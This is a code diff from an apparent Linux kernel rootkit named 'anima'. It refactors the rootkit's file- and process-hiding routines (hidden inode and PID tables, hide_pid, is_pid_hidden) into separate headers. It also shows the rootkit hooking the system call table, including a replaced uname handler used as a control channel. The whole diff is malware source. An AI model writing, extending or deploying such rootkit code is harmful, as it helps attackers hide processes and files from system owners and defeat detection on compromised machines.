@@ -9,6 +9,8 @@
 
 #include <anima/config.h>
 #include <anima/debug.h>
+#include <anima/hide_file.h>
+#include <anima/hide_task.h>
 #include <anima/ksyms.h>
 #include <anima/libc.h>
 #include <anima/uaccess.h>
@@ -29,87 +31,6 @@ static unsigned long fake_sct[NR_SYSCALLS];
 /*
  * FIXME: new algo for better performance
  */
-static u64 hidden_inodes[MAX_HIDDEN_INODES];
-static int hidden_pids[MAX_HIDDEN_PIDS];
-
-static int is_inode_hidden(u64 ino)
-{
-	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
-		if (hidden_inodes[i] == ino)
-			return 1;
-	return 0;
-}
-
-static void hide_inode(u64 ino)
-{
-	pr_debug("%s: ino=%llu\n", __func__, ino);
-
-	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
-		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
-			hidden_inodes[i] = ino;
-			break;
-		}
-	}
-}
-
-static void unhide_inode(u64 ino)
-{
-	pr_debug("%s: ino=%llu\n", __func__, ino);
-
-	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
-		if (hidden_inodes[i] == ino) {
-			hidden_inodes[i] = 0;
-			break;
-		}
-	}
-}
-
-static int is_pid_hidden_no_getpid(pid_t pid)
-{
-	/* pid == 0 => calling process */
-	if (!pid)
-		goto not_hidden;
-
-	for (int i = 0; i < MAX_HIDDEN_PIDS; i++)
-		if (hidden_pids[i] == pid)
-			return 1;
-
-not_hidden:
-	return 0;
-}
-
-static int is_pid_hidden(pid_t pid)
-{
-	/* let calling process access system calls if pid == getpid() */
-	if (pid == ksyms.old_sys_getpid())
-		return 0;
-	return is_pid_hidden_no_getpid(pid);
-}
-
-static void hide_pid(pid_t pid)
-{
-	pr_debug("%s: pid=%d\n", __func__, pid);
-
-	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
-		if (!hidden_pids[i] || hidden_pids[i] == pid) {
-			hidden_pids[i] = pid;
-			break;
-		}
-	}
-}
-
-static void unhide_pid(pid_t pid)
-{
-	pr_debug("%s: pid=%d\n", __func__, pid);
-
-	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
-		if (hidden_pids[i] == pid) {
-			hidden_pids[i] = 0;
-			break;
-		}
-	}
-}
-
 /******************************************************************************
  * filesystem syscalls with path argument
  *
@@ -609,7 +530,7 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		break;
 #ifdef DEBUG
 	case DEBUG_RK:
-		debug_rk(hidden_inodes, hidden_pids);
+		debug_rk();
 		break;
 	case DEBUG_STATS:
 		debug_sys_stats();
@@ -636,8 +557,6 @@ void ia32_system_call_hook(struct pt_regs *regs)
 
 int hook_sys_call_table(void)
 {
-	anima_memset(hidden_inodes, 0, ARRAY_SIZE(hidden_inodes));
-	anima_memset(hidden_pids, 0, ARRAY_SIZE(hidden_pids));
 	anima_memcpy(fake_sct, (void *)ksyms.sys_call_table, sizeof(fake_sct));
 
 	HOOK(uname, new_sys_newuname);
